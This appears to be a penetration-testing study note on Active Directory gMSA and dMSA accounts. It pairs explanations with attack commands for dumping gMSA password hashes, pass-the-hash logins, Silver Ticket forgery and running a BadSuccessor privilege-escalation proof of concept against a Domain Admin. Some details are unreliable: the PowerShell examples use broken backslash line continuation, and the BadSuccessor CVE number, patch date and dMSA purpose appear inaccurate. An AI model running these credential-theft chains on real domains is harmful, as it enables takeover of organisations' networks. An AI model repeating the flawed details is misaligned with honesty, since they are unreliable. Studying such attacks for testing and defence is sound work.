# 📌 gMSA and dMSA Accounts

> Microsoft's answer to weak service account passwords — auto-rotating, uncrackable, 240-char random keys. But a 2025 research finding showed even gMSAs aren't bulletproof.

---

## 🔍 Definition

**gMSA (Group Managed Service Account)** and **dMSA (Delegated Managed Service Account)** are special AD account types designed to replace traditional service accounts with auto-rotating, randomly generated passwords. They eliminate the human element — no one sets or knows the password, the DC manages it. This makes them largely immune to Kerberoasting. However, accounts that are authorized to retrieve the password can still be abused.

---

## 🧠 Core Concepts

- **gMSA** — introduced in Windows Server 2012. Password is a 240-character random string, rotated every 30 days. Stored in `msDS-ManagedPassword` attribute. Only authorized hosts can retrieve it from the DC
- **dMSA (Delegated MSA)** — newer variant (Windows Server 2025). Designed for non-server endpoints. Introduced in 2025 and almost immediately a critical privilege escalation path was found in it (**BadSuccessor**)
- **msDS-GroupMSAMembership** — attribute on the gMSA that defines which principals (machines, users) are allowed to retrieve its password
- **msDS-ManagedPassword** — blob containing the current and previous password. Readable by authorized principals only
- **GMSAPasswordReader** — tool to extract the gMSA password from AD if you have read rights to `msDS-ManagedPassword`
- **Not immune to hash theft** — if you compromise an authorized machine and dump LSASS, the gMSA hash is in there. You can then use it for Pass-the-Hash or forge Silver Tickets
- **BadSuccessor (2025)** — Akamai researcher Yuval Gordon found a privilege escalation in dMSA: if you have `CreateChild` rights on an OU containing a dMSA, or `WriteProperty` on the dMSA, you can configure it to inherit credentials from any user — including Domain Admins. Patched June 2025 (CVE-2025-29810) but widely exploitable before patching

---

## ⚙️ How Password Retrieval Works (gMSA)

1. gMSA is created, authorized hosts listed in `msDS-GroupMSAMembership`
2. Authorized host (e.g., `WEB01$`) sends KDS request to KDC
3. KDC returns the current managed password
4. Host uses the password to authenticate as the gMSA for services

**Attacker angle:**
- If you compromise `WEB01$` (an authorized host), you can retrieve the gMSA password from AD — the machine account has the right to query it
- If you have `GenericAll` or `WriteProperty` on the gMSA object in LDAP, you may be able to modify `msDS-GroupMSAMembership` to add yourself

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| msDS-ManagedPassword | Attribute holding the encrypted current + previous password blob |
| msDS-GroupMSAMembership | Defines who can read the managed password |
| KDS Root Key | Domain-wide key used to derive gMSA passwords. Stored on DC |
| GMSAPasswordReader | Tool to dump gMSA passwords if you're an authorized reader |
| NetExec gMSA module | `nxc ldap --gmsa` — dumps gMSA hashes if you're authorized |
| BadSuccessor | dMSA privilege escalation (CVE-2025-29810) — patch June 2025 |
| Kerberoast-resistant | 240-char random password makes offline cracking computationally infeasible |
| Pass-the-Hash with gMSA | If the NTLM hash is retrieved, it's usable for PtH like any other hash |

---

## 🔥 Important Details & Gotchas

- **Kerberoasting immune** — you'll get a `$krb5tgs$18$` or `$krb5tgs$23$` hash, but it won't crack because the password is 240 random chars. Don't waste GPU time
- **Still dumpable via LSASS** — if gMSA runs on a server and you have SYSTEM on that server, LSASS contains the current gMSA hash. Dump it, PtH it, Silver Ticket with it
- **gMSA hash via LDAP** — if your compromised account is listed in `msDS-GroupMSAMembership`, you can retrieve the gMSA hash over LDAP directly. No need to be on the host
- **BloodHound shows ReadGMSAPassword edge** — if BloodHound shows `ReadGMSAPassword` from any compromised node to a gMSA, that's an exploitable path
- **BadSuccessor** — patched June 2025 (KB5058379 / KB5058392). Unpatched Windows Server 2025 systems remain vulnerable. Check BloodHound for `msDS-DelegatedMSAState` attributes on dMSA objects
- **KDS Root Key 10-hour delay** — when a new KDS Root Key is created, there's a 10-hour propagation wait before gMSA passwords can be issued. In lab setups, this is sometimes bypassed with the `-EffectiveTime` parameter — important for lab setup

---

## 🌍 Real-World Usage / Examples

**Find gMSAs in the domain:**
```bash
# Via LDAP
ldapsearch -x -H ldap://<DC-IP> -D "corp\user" -w "pass" \
  -b "DC=corp,DC=local" "(objectClass=msDS-GroupManagedServiceAccount)" \
  sAMAccountName msDS-GroupMSAMembership

# Via netexec
nxc ldap <DC-IP> -u user -p pass --gmsa

# Via PowerShell
Get-ADServiceAccount -Filter * -Properties msDS-GroupMSAMembership
```

**Check if your account can read the gMSA password:**
```bash
# BloodHound — search for ReadGMSAPassword edge from owned nodes
# Or manually check msDS-GroupMSAMembership

# PowerShell
$gmsa = Get-ADServiceAccount -Identity "svc_web" \
  -Properties msDS-ManagedPassword
$gmsa.'msDS-ManagedPassword'
```

**Dump gMSA password (if authorized):**
```bash
# netexec (from Kali — if you're an authorized principal)
nxc ldap <DC-IP> -u user -p pass --gmsa

# GMSAPasswordReader (Windows, from authorized machine)
.\GMSAPasswordReader.exe --AccountName svc_web

# Python script
python3 gMSADumper.py -u user -p pass -d corp.local
# Outputs: sAMAccountName:::NTHASH (hashcat ready)
```

**Use the gMSA hash:**
```bash
# Pass-the-Hash
evil-winrm -i <target-IP> -u svc_web$ -H <ntlm_hash>
nxc smb <target-IP> -u svc_web$ -H <ntlm_hash>

# Silver Ticket
impacket-ticketer -nthash <gmsa_ntlm_hash> \
  -domain-sid S-1-5-21-XXXX \
  -domain corp.local \
  -spn cifs/target.corp.local \
  Administrator
```

**BadSuccessor (CVE-2025-29810) — dMSA privesc (pre-patch):**
```bash
# Check if target is Windows Server 2025 and unpatched
# Requires: CreateChild on OU with dMSA, or WriteProperty on dMSA

# 1. Create/modify dMSA to inherit from DA account
# 2. Authorize your machine to retrieve its password
# 3. Retrieve password → authenticate as DA

# Akamai's PoC: https://github.com/akamai/BadSuccessor
python3 badsuccessor.py -u user -p pass -d corp.local \
  -dc-ip <DC-IP> -target-user Administrator
```

---

## 🔗 Related Topics

- [[Kerberoasting Deep Dive]]
- [[Active Directory (AD)]]
- [[NTLM and Pass-the-Hash]]
- [[BloodHound & Attack Path Analysis]]
- [[Silver Ticket Attacks]]
- [[Kerberos Authentication]]
- [[Delegation Attacks (Constrained, Unconstrained)]]

---

## 📚 Sources / Further Reading

- [Akamai — BadSuccessor Research (May 2025)](https://www.akamai.com/blog/security-research/badsuccessor-abusing-dmsas-to-escalate-privileges-in-active-directory) — original dMSA privesc research
- [Microsoft — gMSA Overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/group-managed-service-accounts-overview) — official docs
- [The Hacker Recipes — ReadGMSAPassword](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword) — exploitation walkthrough
- gMSADumper: `https://github.com/micahvandeusen/gMSADumper`
- GMSAPasswordReader: `https://github.com/expl0itabl3/Toolies`
- HTB Machine: `Search` (gMSA exploitation path)
